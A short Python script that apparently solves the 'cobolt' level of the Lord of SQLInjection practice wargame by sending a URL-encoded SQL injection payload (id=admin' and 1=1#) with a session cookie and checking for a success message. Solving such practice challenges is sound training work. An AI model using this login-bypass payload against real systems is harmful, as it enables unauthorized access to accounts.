import requests
from dotenv import load_dotenv
import os

load_dotenv()
url=os.environ.get('LOS_URL')+'chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin%27%20and%201=1%23&pw=pw'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "COBOLT Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)